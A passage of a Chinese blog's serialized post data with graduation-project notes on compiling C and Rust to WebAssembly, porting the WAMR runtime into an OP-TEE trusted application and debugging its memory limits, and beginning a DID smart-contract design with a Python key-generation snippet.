class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#[no_mangle]</span></span><br><span class=\"line\"><span class=\"keyword\">pub</span> <span class=\"keyword\">fn</span> <span class=\"title function_\">test</span>() <span class=\"punctuation\">-&gt;</span> <span class=\"type\">i32</span> {</span><br><span class=\"line\">    <span class=\"number\">1_i32</span>.<span class=\"title function_ invoke__\">wrapping_add</span>(<span class=\"number\">2</span>)</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(module $test-rs.wasm</span><br><span class=\"line\">  (type (;0;) (func (result i32)))</span><br><span class=\"line\">  (func $test (type 0) (result i32)</span><br><span class=\"line\">    (local i32)</span><br><span class=\"line\">    i32.const 3</span><br><span class=\"line\">    local.set 0</span><br><span class=\"line\">    local.get 0</span><br><span class=\"line\">    return)</span><br><span class=\"line\">  (memory (;0;) 1)</span><br><span class=\"line\">  (global $__stack_pointer (mut i32) (i32.const 32768))</span><br><span class=\"line\">  (export \"memory\" (memory 0))</span><br><span class=\"line\">  (export \"test\" (func $test)))</span><br></pre></td></tr></table></figure>\n<p>纯C默认不做运行时检查，假设程序员知道自己在做什么；Rust默认的简单运算也会有很多安全保证。</p>\n<h3 id=\"返回字符串\">3.1.3 返回字符串</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">char</span> *<span class=\"title function_\">test</span><span class=\"params\">()</span></span><br><span class=\"line\">{</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">\"Hello, World!\"</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#![no_std]</span></span><br><span class=\"line\"><span class=\"meta\">#![no_main]</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#[panic_handler]</span></span><br><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">panic</span>(_: &amp;core::panic::PanicInfo) <span class=\"punctuation\">-&gt;</span> ! {</span><br><span class=\"line\">    <span class=\"keyword\">loop</span> {}</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#[no_mangle]</span></span><br><span class=\"line\"><span class=\"keyword\">pub</span> <span class=\"keyword\">fn</span> <span class=\"title function_\">test</span>() <span class=\"punctuation\">-&gt;</span> *<span class=\"keyword\">const</span> <span class=\"type\">u8</span> {</span><br><span class=\"line\">    <span class=\"string\">\"Hello, World!\"</span>.<span class=\"title function_ invoke__\">as_ptr</span>()</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(module $test-c.wasm</span><br><span class=\"line\">  (type (;0;) (func (result i32)))</span><br><span class=\"line\">  (func $test (type 0) (result i32)</span><br><span class=\"line\">    i32.const 1024)</span><br><span class=\"line\">  (memory (;0;) 2)</span><br><span class=\"line\">  (global $__stack_pointer (mut i32) (i32.const 66576))</span><br><span class=\"line\">  (export \"memory\" (memory 0))</span><br><span class=\"line\">  (export \"test\" (func $test))</span><br><span class=\"line\">  (data $.rodata (i32.const 1024) \"Hello, World!\\00\"))</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(module $test-rs.wasm</span><br><span class=\"line\">  (type (;0;) (func (result i32)))</span><br><span class=\"line\">  (func $test (type 0) (result i32)</span><br><span class=\"line\">    (local i32)</span><br><span class=\"line\">    i32.const 32768</span><br><span class=\"line\">    local.set 0</span><br><span class=\"line\">    local.get 0</span><br><span class=\"line\">    return)</span><br><span class=\"line\">  (memory (;0;) 1)</span><br><span class=\"line\">  (global $__stack_pointer (mut i32) (i32.const 32768))</span><br><span class=\"line\">  (export \"memory\" (memory 0))</span><br><span class=\"line\">  (export \"test\" (func $test))</span><br><span class=\"line\">  (data $.rodata (i32.const 32768) \"Hello, World!\"))</span><br></pre></td></tr></table></figure>\n<p>有个有意思的地方，Rust的字符串不会带尾零。侧面说明了 Rust\n的一个习惯：传指针之后要传数组长度。纯C经常直接传指针，靠尾零区分的。</p>\n<p>这里的 \"Hello World!\" 作为一个字符串常量，存储在栈空间中。</p>\n<p>直接运行 wasm ，结果为：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ./iwasm -f test test-c.wasm</span></span><br><span class=\"line\">0x400:i32</span><br><span class=\"line\"><span class=\"comment\"># ./iwasm -f test test-rs.wasm</span></span><br><span class=\"line\">0x8000:i32</span><br></pre></td></tr></table></figure>\n<p>返回的是一个指针地址。wasm 中的\n<code>(export \"memory\" (memory 0))</code>\n暴露了内存空间，可以在这个内存空间的对应位置访问到字符串的值。</p>\n<p>wamr中，export 的 memory 会映射在外部的内存空间中，通过\n<code>wasm_runtime_addr_app_to_native</code> 函数将 wasm\n内部的地址转换为外部的地址。</p>\n<h3 id=\"多内存提案\">3.1.4 多内存提案</h3>\n<figure class=\"highlight rust\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#![no_std]</span></span><br><span class=\"line\"><span class=\"meta\">#![no_main]</span></span><br><span class=\"line\"><span class=\"meta\">#![allow(static_mut_refs)]</span></span><br><span class=\"line\"><span class=\"keyword\">use</span> core::alloc::{GlobalAlloc, Layout};</span><br><span class=\"line\"><span class=\"keyword\">use</span> core::sync::atomic::{AtomicUsize, Ordering};</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#[panic_handler]</span></span><br><span class=\"line\"><span class=\"keyword\">fn</span> <span class=\"title function_\">panic</span>(_: &amp;core::panic::PanicInfo) <span class=\"punctuation\">-&gt;</span> ! {</span><br><span class=\"line\">    <span class=\"keyword\">loop</span> {}</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> HEAP_SIZE: <span class=\"type\">usize</span> = <span class=\"number\">65536</span>;</span><br><span class=\"line\"><span class=\"meta\">#[no_mangle]</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">mut</span> HEAP: [<span class=\"type\">u8</span>; HEAP_SIZE] = [<span class=\"number\">0</span>; HEAP_SIZE];</span><br><span class=\"line\"><span class=\"keyword\">static</span> HEAP_PTR: AtomicUsize = AtomicUsize::<span class=\"title function_ invoke__\">new</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">SimpleAllocator</span>;</span><br><span class=\"line\"><span class=\"keyword\">unsafe</span> <span class=\"keyword\">impl</span> <span class=\"title class_\">GlobalAlloc</span> <span class=\"keyword\">for</span> <span class=\"title class_\">SimpleAllocator</span> {</span><br><span class=\"line\">    <span class=\"keyword\">unsafe</span> <span class=\"keyword\">fn</span> <span class=\"title function_\">alloc</span>(&amp;<span class=\"keyword\">self</span>, layout: Layout) <span class=\"punctuation\">-&gt;</span> *<span class=\"keyword\">mut</span> <span class=\"type\">u8</span> {</span><br><span class=\"line\">        <span class=\"keyword\">let</span> <span class=\"variable\">offset</span> = HEAP_PTR.<span class=\"title function_ invoke__\">fetch_add</span>(layout.<span class=\"title function_ invoke__\">size</span>(), Ordering::SeqCst);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> offset + layout.<span class=\"title function_ invoke__\">size</span>() &gt; HEAP_SIZE {</span><br><span class=\"line\">            <span class=\"keyword\">return</span> core::ptr::<span class=\"title function_ invoke__\">null_mut</span>();</span><br><span class=\"line\">        }</span><br><span class=\"line\">        HEAP.<span class=\"title function_ invoke__\">as_mut_ptr</span>().<span class=\"title function_ invoke__\">add</span>(offset)</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">unsafe</span> <span class=\"keyword\">fn</span> <span class=\"title function_\">dealloc</span>(&amp;<span class=\"keyword\">self</span>, _ptr: *<span class=\"keyword\">mut</span> <span class=\"type\">u8</span>, _layout: Layout) {</span><br><span class=\"line\">        <span class=\"comment\">// 这个简单实现不支持内存释放</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"meta\">#[global_allocator]</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> ALLOCATOR: SimpleAllocator = SimpleAllocator;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"keyword\">crate</span> alloc;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> alloc::string::<span class=\"type\">String</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#[no_mangle]</span></span><br><span class=\"line\"><span class=\"keyword\">pub</span> <span class=\"keyword\">fn</span> <span class=\"title function_\">test</span>() <span class=\"punctuation\">-&gt;</span> *<span class=\"keyword\">const</span> <span class=\"type\">u8</span> {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> <span class=\"keyword\">mut </span><span class=\"variable\">buf</span> = <span class=\"type\">String</span>::<span class=\"title function_ invoke__\">new</span>();</span><br><span class=\"line\">    buf.<span class=\"title function_ invoke__\">push_str</span>(<span class=\"string\">\"Hello, World!\"</span>);</span><br><span class=\"line\">    buf.<span class=\"title function_ invoke__\">as_ptr</span>()</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>实验发现，使用 <code>alloc</code> 里的其他库貌似没有问题，唯独会用\n<code>String::new()</code> 会让 wamrc 编译不通过。</p>\n<p>直接运行 wasm ，报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[04:30:07:055 - 75C5E7216040]: warning: failed to link import function (env, memset)</span><br><span class=\"line\">[04:30:07:055 - 75C5E7216040]: warning: failed to link import function (env, memcpy)</span><br><span class=\"line\">[04:30:07:055 - 75C5E7216040]: warning: failed to link import function (env, memmove)</span><br><span class=\"line\">Error: ExecutionError(ExecError { message: \"Exception: failed to call unlinked import function (env, memcpy)\", exit_code: 0 })</span><br></pre></td></tr></table></figure>\n<p>实现了外部接口后，报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Error: ExecutionError(ExecError { message: \"Exception: wasm operand stack overflow\", exit_code: 0 })</span><br></pre></td></tr></table></figure>\n<p>直接用 iwasm 或 wamrc 报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">WASM module load failed: zero byte expected</span><br></pre></td></tr></table></figure>\n<p>检查 iwasm 源码，发现是因为编译时未启用\n<code>WASM_ENABLE_MULTI_MEMORY</code> 选项（多内存提案）</p>\n<blockquote>\n<p>多内存提案（Multi-Memory Proposal）是 WebAssembly\n的一个扩展特性，简单说就是<strong>让一个WASM模块能同时拥有多个独立的内存块</strong>。这就像给你的程序开了多个独立仓库，每个仓库可以存不同类型的东西，互不干扰。</p>\n<hr>\n<h3 id=\"传统模式-vs-多内存模式\">传统模式 vs 多内存模式</h3>\n<table>\n<colgroup>\n<col style=\"width: 15%\">\n<col style=\"width: 31%\">\n<col style=\"width: 53%\">\n</colgroup>\n<thead>\n<tr>\n<th></th>\n<th>传统单内存</th>\n<th>多内存模式</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>内存数量</strong></td>\n<td>只能有1块内存（memory 0）</td>\n<td>可声明多个内存（memory 0,1,2...）</td>\n</tr>\n<tr>\n<td><strong>内存操作</strong></td>\n<td>所有指令默认操作memory 0</td>\n<td>指令需指定操作哪个内存（如 memory.load 1）</td>\n</tr>\n<tr>\n<td><strong>应用场景</strong></td>\n<td>简单场景</td>\n<td>复杂模块化/沙盒/多线程场景</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h3 id=\"为什么需要这个功能\">为什么需要这个功能？</h3>\n<ol type=\"1\">\n<li><p><strong>模块化开发</strong><br>\n不同库可以使用独立内存，避免内存污染（比如一个加密库和一个图形库各自用独立内存）</p></li>\n<li><p><strong>安全隔离</strong><br>\n高风险操作（如解析不可信数据）可放在独立内存，崩溃时不影响主内存</p></li>\n<li><p><strong>并行优化</strong><br>\n多线程中不同线程可绑定不同内存（需配合线程提案使用）</p></li>\n<li><p><strong>内存复用</strong><br>\n可创建专用内存（比如单独给GC分配一块内存）</p></li>\n</ol>\n<hr>\n<h3 id=\"实际代码示例\">实际代码示例</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">;; 声明两个内存</span><br><span class=\"line\">(module</span><br><span class=\"line\">  (memory $mem1 1)  ;; 第一个内存初始1页（64KB）</span><br><span class=\"line\">  (memory $mem2 2)  ;; 第二个内存初始2页</span><br><span class=\"line\"></span><br><span class=\"line\">  ;; 在第二个内存写入数据</span><br><span class=\"line\">  (data (memory $mem2) (i32.const 0) \"hello\")</span><br><span class=\"line\"></span><br><span class=\"line\">  ;; 从第二个内存加载数据</span><br><span class=\"line\">  (func $get_hello</span><br><span class=\"line\">    (i32.load $mem2 (i32.const 0)) </span><br><span class=\"line\">  )</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<hr>\n<h3 id=\"当前状态\">当前状态</h3>\n<ul>\n<li>2023年已成为<strong>官方标准</strong>（Phase 4）</li>\n<li>需要运行时环境支持（如Wasmtime需开启<code>--enable-multi-memory</code>）</li>\n<li>主流浏览器逐步支持中（Chrome 119+已实现）</li>\n</ul>\n</blockquote>\n<p>所以解决方案有两个：</p>\n<ul>\n<li>重新编译 iwasm 和 wamrc，使其支持 multi-memory</li>\n<li>禁用 Rust 编译的时候启用多内存提案</li>\n</ul>\n<p>还是重新编译 iwasm 和 wamrc 。</p>\n<p>在\n<code>wasm-micro-runtime/product-mini/platforms/linux/CMakeLists.txt</code>\n的最后添加：</p>\n<figure class=\"highlight cmake\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 为所有目标添加预处理器宏</span></span><br><span class=\"line\"><span class=\"keyword\">add_definitions</span>(-DWASM_ENABLE_MULTI_MEMORY)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 或者为特定目标添加预处理器宏</span></span><br><span class=\"line\"><span class=\"keyword\">target_compile_definitions</span>(iwasm PRIVATE WASM_ENABLE_MULTI_MEMORY)</span><br></pre></td></tr></table></figure>\n<p>重新编译得到的 iwasm 不会报错 zero byte expected，但是和直接用\nwasm-sdk 运行一样报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">wasm operand stack overflow</span><br></pre></td></tr></table></figure>\n<p>有可能是因为自定义实现的内存分配器有问题。改成使用\n<code>wee_alloc</code> ，可以了。</p>\n<h2 id=\"移植-wamr\">3.2 移植 wamr</h2>\n<h3 id=\"阅读文档重写代码\">3.2.1 阅读文档重写代码</h3>\n<p>https://wamr.gitbook.io/document/wamr-in-practice/advance-tutorial/port_wamr</p>\n<p>这部分略，修改后的代码之后开源。</p>\n<p>主要思路就是实现新增的接口，根据报错信息（<code>undefined reference to XXXX</code>）实现新的接口。</p>\n<h3 id=\"简单的测试\">3.2.2 简单的测试</h3>\n<p>最简单的wasm没有问题，不会报错。</p>\n<p>但是当运行复杂一点程序时，TA 中报错：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">D/TA:  os_mmap:111 os_mmap(addr=0x40049000, size=144412, aligned size=147456, prot=0x7) memory allocated.</span><br><span class=\"line\">D/TA:  os_mprotect:171 os_mprotect(addr=0x40049000, size=147456, prot=7) OK.</span><br><span class=\"line\">D/TA:  os_mmap:123 os_mmap(addr=0x40049000, size=144412, aligned size=147456, prot=0x7) protection set.</span><br><span class=\"line\">D/TA:  os_mmap:111 os_mmap(addr=0x4006d000, size=8192, aligned size=8192, prot=0x3) memory allocated.</span><br><span class=\"line\">D/TA:  os_mprotect:171 os_mprotect(addr=0x4006d000, size=8192, prot=3) OK.</span><br><span class=\"line\">D/TA:  os_mmap:123 os_mmap(addr=0x4006d000, size=8192, aligned size=8192, prot=0x3) protection set.</span><br><span class=\"line\">D/TC:? 0 tee_ta_invoke_command:798 Error: ffff000c of 4</span><br><span class=\"line\">E/TA:  tee_map_zi:56 Invoke PTA_SYSTEM_MAP_ZI: res=0xffff000c</span><br><span class=\"line\">I/TA: os_mmap(size=155648, aligned size=155648, prot=0x3) failed.</span><br></pre></td></tr></table></figure>\n<p><code>0xffff000c</code> 是 <code>TEE_ERROR_OUT_OF_MEMORY</code>\n内存不足。</p>\n<p>估计是最多只能分配256KB。</p>\n<p>先重新试试之前的 wamr 看看内存分配多少。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">D/TA:  os_mmap:103 os_mmap(addr=0x40049000, size=141040, aligned size=143360, prot=0x7) memory allocated.</span><br><span class=\"line\">D/TA:  os_mprotect:156 os_mprotect(addr=0x40049000, size=143360, prot=7) OK.</span><br><span class=\"line\">D/TA:  os_mmap:114 os_mmap(addr=0x40049000, size=141040, aligned size=143360, prot=0x7) protection set.</span><br><span class=\"line\">D/TA:  os_mmap:103 os_mmap(addr=0x4006c000, size=2306, aligned size=4096, prot=0x3) memory allocated.</span><br><span class=\"line\">D/TA:  os_mprotect:156 os_mprotect(addr=0x4006c000, size=4096, prot=3) OK.</span><br><span class=\"line\">D/TA:  os_mmap:114 os_mmap(addr=0x4006c000, size=2306, aligned size=4096, prot=0x3) protection set.</span><br><span class=\"line\">D/TA:  os_mprotect:156 os_mprotect(addr=0x40049000, size=141040, prot=5) OK.</span><br><span class=\"line\">D/TA:  os_mprotect:156 os_mprotect(addr=0x4006c000, size=2306, prot=1) OK.</span><br><span class=\"line\">E/TA:  aot_instantiate:982 check heap size is OK.</span><br><span class=\"line\">E/TA:  aot_instantiate:1000 calculate size of table data is OK.</span><br><span class=\"line\">E/TA:  aot_instantiate:1007 Allocate module instance, global data, table data and heap data is OK.</span><br><span class=\"line\">E/TA:  aot_instantiate:1019 Initialize global info is OK.</span><br><span class=\"line\">E/TA:  aot_instantiate:1030 Initialize table info is OK.</span><br><span class=\"line\">E/TA:  memories_instantiate:647 info: runtime_malloc is OK</span><br><span class=\"line\">E/TA:  memories_instantiate:651 debug: 0</span><br><span class=\"line\">E/TA:  memory_instantiate:361 info: memory_instantiate</span><br><span class=\"line\">E/TA:  memory_instantiate:473 info: 1</span><br><span class=\"line\">E/TA:  memory_instantiate:480 num_bytes_per_page=65536, init_page_count=3, max_page_count=16385, heap_offset=131072, heap_size=64512</span><br><span class=\"line\">E/TA:  memory_instantiate:485 total_size=196608</span><br></pre></td></tr></table></figure>\n<p>总共分配的内存不到 200 KB。</p>\n<p>发现是 TA 的 <code>TA_InitializeWamrRuntime</code> 里写死了\n<code>stack_size = 256 * 1024</code> 。。。</p>\n<p>归根结底是不了解 WAMR 的内存模型。</p>\n<p>分P吧。</p>\n<h1 id=\"其他碎碎念\">其他碎碎念</h1>\n<p>cosmos首次启动，调用TA生成RSA密钥对，私钥直接加密存储在TEE里，公钥返回在链上保存。</p>\n<p>其他节点加入区块链，与种子节点建立TLS连接，将私钥加密传输。</p>\n<p>自始至终，外界无法得知私钥。</p>\n<p>如果外界写一个新的TA用户获取加密存储的数据，那只用知道私钥存放的id，不就可以获取私钥了吗？并不会，因为OPTEE的Secure\nStorage\nAPI是按照TA的UUID进行隔离存储的，别的恶意TA无法访问秘钥生成TA的安全空间。</p>\n<p>所以应该只有一个TA，包含了生成私钥、执行智能合约等全部功能。</p>\n","categories":["笔记"],"tags":["区块链","毕设","数字身份"]},{"title":"毕设18 - WAMR 内存模型","url":"/graduation-project/18/","content":"<p>参考资料：https://wamr.gitbook.io/document/wamr-in-practice/advance-tutorial/memory_tune</p>\n<span id=\"more\"></span>\n<p>有两种可能：</p>\n<ol type=\"1\">\n<li>OPTEE的TA最多只能使用64KB的内存，需要想办法增加TA可使用的内存。</li>\n<li>调用wasm的时候，错误设置了wasm最大允许使用的内存为64KB。</li>\n</ol>\n<p>先在非TA环境中，使用wamr运行wasm，测试结果。</p>\n<p>结论：</p>\n<ul>\n<li>在非TA环境中，wasm 的内存限制由编译时的参数\n<code>-Wl,--max-memory=n1</code> 决定。</li>\n<li>而在TA环境中，无论编译时设计 max-memory 为多大，都最多只能分配 64KB\n的空间。</li>\n</ul>\n<p>所以，下一步验证 TA 的内存。</p>\n<p>编写 TA ，发现可以 <code>TEE_Malloc</code> 的最大内存不能超过\n<code>TA_DATA_SIZE</code>。</p>\n<p>然后修改 watz 的 <code>TA_DATA_SIZE</code>，但是运行 wasm\n时仍然报一样的错，os_mmap 最多只有 64KB。</p>\n<p>突然意识到，发现 TA_Malloc 和 mmap 本质上可能是不同的。</p>\n<p><code>os_mmap</code> 会调用 <code>tee_map_zi</code> 而不会调用\n<code>TA_Malloc</code> 。</p>\n<p>编写 TA，测试 <code>tee_map_zi</code> 能映射的最大空间，发现可以达到\n12.57MB。</p>\n<p>这很奇怪了，watz 分配大约 64KB 就分配失败了。并且 12.57MB\n这个参数是哪里来的？</p>\n<p>刚刚测试 TA 的 <code>TA_DATA_SIZE = 32KB</code> ，下面换成\n<code>4MB</code> 测试一下能映射多少。8.60 MB!!!!</p>\n<p>减少了约4MB。</p>\n<p>所以，<code>TA_DATA_SIZE</code> 和 <code>tee_map_zi</code>\n能映射的空间（再加上系统占用的部分内存）总共约为 <code>13MB</code> !</p>\n<p>减小 watz 的 <code>TA_DATA_SIZE</code> 从 12MB 到 4MB：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># optee_wamr 1000000 test-c.aot </span><br><span class=\"line\">内存分配失败，当前已分配: 2766 KB</span><br><span class=\"line\">total: 2766</span><br></pre></td></tr></table></figure>\n<p>如果后续还有内存分配不足的情况，需要考虑如何增加 qemu\n的可分配内存大小。</p>\n<p>那下一步应该是什么。</p>\n<ul>\n<li>开始写 DID\n的合约！在写合约的过程中，遇到需要更新的函数就更新TA。</li>\n<li>最终逐步重写 Rust 的\nWAMR，实现秘钥管理、秘钥传播等，实现智能合约的安全原语。</li>\n</ul>\n<h1 id=\"附录\">附录</h1>\n<h2 id=\"tee_malloc-和-tee_map_zi-的区别\"><code>TEE_Malloc</code> 和\n<code>tee_map_zi</code> 的区别</h2>\n<h3 id=\"功能定位不同\">1. 功能定位不同</h3>\n<ul>\n<li><strong>TEE_Malloc</strong>：\n<ul>\n<li>是一个标准的内存分配函数，类似于 C 语言中的 <code>malloc</code></li>\n<li>用于在 TA (Trusted Application) 的堆上分配内存</li>\n<li>属于 TEE 内部 API 的一部分，供 TA 开发者使用</li>\n</ul></li>\n<li><strong>tee_map_zi</strong>：\n<ul>\n<li>是一个底层内存映射函数，用于映射零初始化的内存区域</li>\n<li>\"zi\" 表示 \"Zero Initialized\"</li>\n<li>通过调用系统 PTA (Pseudo Trusted Application) 来实现内存映射</li>\n<li>是一个扩展 API，主要用于特殊场景</li>\n</ul></li>\n</ul>\n<h3 id=\"实现机制不同\">2. 实现机制不同</h3>\n<ul>\n<li><strong>TEE_Malloc</strong>：\n<ul>\n<li>基于传统的堆内存管理，使用 <code>calloc</code>、<code>malloc</code>\n等底层函数</li>\n<li>根据不同的 hint 参数选择不同的分配策略</li>\n<li>可以选择是否进行零初始化（通过 <code>TEE_MALLOC_FILL_ZERO</code>\n标志）</li>\n<li>可以选择是否使用不共享的内存区域（通过\n<code>TEE_MALLOC_NO_SHARE</code> 标志）</li>\n</ul></li>\n<li><strong>tee_map_zi</strong>：\n<ul>\n<li>通过调用 <code>invoke_system_pta</code> 函数与系统 PTA 通信</li>\n<li>使用 <code>PTA_SYSTEM_MAP_ZI</code> 命令请求内核映射内存</li>\n<li>可以创建可共享的内存区域（通过\n<code>TEE_MEMORY_ACCESS_ANY_OWNER</code> 标志）</li>\n<li>总是返回零初始化的内存</li>\n</ul></li>\n</ul>\n<h3 id=\"使用场景不同\">3. 使用场景不同</h3>\n<ul>\n<li><strong>TEE_Malloc</strong>：\n<ul>\n<li>适用于常规的内存分配需求</li>\n<li>TA 开发者直接使用的 API</li>\n<li>用于分配相对较小的内存块</li>\n<li>内存归属于当前 TA 的堆</li>\n</ul></li>\n<li><strong>tee_map_zi</strong>：\n<ul>\n<li>用于需要共享内存的场景，特别是在 TA 之间共享内存</li>\n<li>用于需要映射大块内存的场景</li>\n<li>在系统级别操作，如临时缓冲区的创建</li>\n<li>在代码中主要用于创建临时缓冲区，以便在 TA 之间安全地传递数据</li>\n</ul></li>\n</ul>\n<h3 id=\"内存特性不同\">4. 内存特性不同</h3>\n<ul>\n<li><strong>TEE_Malloc</strong>：\n<ul>\n<li>分配的内存在 TA 的虚拟地址空间内</li>\n<li>内存可以是私有的或共享的（取决于 hint 参数）</li>\n<li>可以使用 <code>TEE_Free</code> 释放</li>\n</ul></li>\n<li><strong>tee_map_zi</strong>：\n<ul>\n<li>映射的内存可以在 TA 之间共享</li>\n<li>总是零初始化的</li>\n<li>需要使用 <code>tee_unmap</code> 来解除映射</li>\n</ul></li>\n</ul>\n<h3 id=\"实际应用示例\">5. 实际应用示例</h3>\n<p>从代码中可以看到，<code>tee_map_zi</code> 在\n<code>map_tmp_param</code> 函数中被用来创建临时缓冲区，这些缓冲区用于在\nTA 之间安全地传递数据，特别是当参数指向 TA 私有内存时。</p>\n<h3 id=\"总结\">总结</h3>\n<p><code>TEE_Malloc</code> 和 <code>tee_map_zi</code>\n的主要区别在于：</p>\n<ol type=\"1\">\n<li><code>TEE_Malloc</code> 是一个标准的内存分配函数，用于在 TA\n的堆上分配内存</li>\n<li><code>tee_map_zi</code>\n是一个底层内存映射函数，用于映射零初始化的内存区域，特别适用于需要共享内存的场景</li>\n<li><code>TEE_Malloc</code> 提供更多的内存分配选项，而\n<code>tee_map_zi</code> 专注于创建可共享的零初始化内存</li>\n<li><code>tee_map_zi</code> 通过系统 PTA 实现，而\n<code>TEE_Malloc</code> 使用传统的堆内存管理</li>\n</ol>\n<p>在 OP-TEE\n系统中，这两个函数在不同的层次和场景下提供内存管理功能，共同支持安全可靠的可信应用程序执行环境。</p>\n","categories":["笔记"],"tags":["毕设","WAMR"]},{"title":"毕设19 - DID 智能合约","url":"/graduation-project/19/","content":"<p>开始写 DID 的合约！在写合约的过程中，遇到需要更新的函数就更新TA。</p>\n<span id=\"more\"></span>\n<h1 id=\"did设计\">0 DID设计</h1>\n<h2 id=\"加密算法\">0.1 加密算法</h2>\n<h3 id=\"非对称加密\">非对称加密</h3>\n<p>常见的非对称加密算法包括 <strong>RSA</strong> 和\n<strong>ECC</strong>。</p>\n<ul>\n<li><p><strong>RSA</strong> 支持\n<strong>公钥加密、私钥解密</strong>，但加密数据长度有限（约 200\n字节），且计算效率较低。</p></li>\n<li><p><strong>ECC</strong>\n<strong>不直接支持公钥加密、私钥解密</strong>，但可用于<strong>计算共享密钥</strong>（如\nECDH），常用于安全通信。</p></li>\n</ul>\n<h3 id=\"对称加密\">对称加密</h3>\n<p>常见的对称加密算法包括 <strong>AES</strong>。</p>\n<ul>\n<li><p>加密和解密使用相同的密钥，可高效处理大规模数据。</p></li>\n<li><p>常见应用方式：先使用\n<strong>非对称加密传输对称密钥</strong>，再用 <strong>对称加密</strong>\n保护数据传输。</p></li>\n</ul>\n<h2 id=\"创建did文档\">0.2 创建DID文档</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create_did</span>():</span><br><span class=\"line\">    <span class=\"comment\"># 生成 NIST P-256 (secp256r1) 私钥</span></span><br><span class=\"line\">    private_key = ec.generate_private_key(ec.SECP256R1())</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 获取未压缩公钥（65 字节，0x04 前缀 + X + Y）</span></span><br><span class=\"line\">    public_key = private_key.public_key().public_bytes(</span><br><span class=\"line\">        encoding=serialization.Encoding.X962,</span><br><span class=\"line\">        <span class=\"built_in\">format</span>=serialization.PublicFormat.UncompressedPoint</span><br><span class=\"line\">    )</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 生成 bech32 格式的 DID</span></span><br><span class=\"line\">    did = bech32.bech32_encode(<span class=\"string\">\"did:swt:\"</span>, bech32.convertbits(public_key, <span class=\"number\">8</span>, <span class=\"number\">5</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 将公钥转换为 Base64URL 编码</span></span><br><span class=\"line\">    public_key_multibase = base64.urlsafe_b64encode(public_key).decode().rstrip(<span class=\"string\">\"=\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 创建 DID 文档</span></span><br><span class=\"line\">    did_document = {</span><br><span class=\"line\">        <span class=\"string\">\"@context\"</span>: <span class=\"string\">\"https://www.w3.org/ns/did/v1\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"id\"</span>: did,</span><br><span class=\"line\">        <span class=\"string\">\"verificationMethod\"</span>: [</span><br><span class=\"line\">            {</span><br><span class=\"line\">                <span class=\"string\">\"id\"</span>: <span class=\"string\">f\"<span class=\"subst\">{did}</span>#keys-1\"</span>,</span><br><span class=\"line\">                <span class=\"string\">\"type\"</span>: <span class=\"string\">\"EcdsaSecp256r1VerificationKey2019\"</span>,</span><br><span class=\"line\">                <span class=\"string\">\"controller\"</span>: did,</span><br><span class=\"line\">                <span class=\"string\">\"publicKeyMultibase\"</span>: public_key_multibase</span><br><span class=\"line\">            }</span><br><span class=\"line\">        ],</span><br><span class=\"line\">        <span class=\"string\">\"authentication\"</span>: [<span class=\"string\">f\"<span class=\"subst\">{did}</span>#keys-1\"</span>]</span><br><span 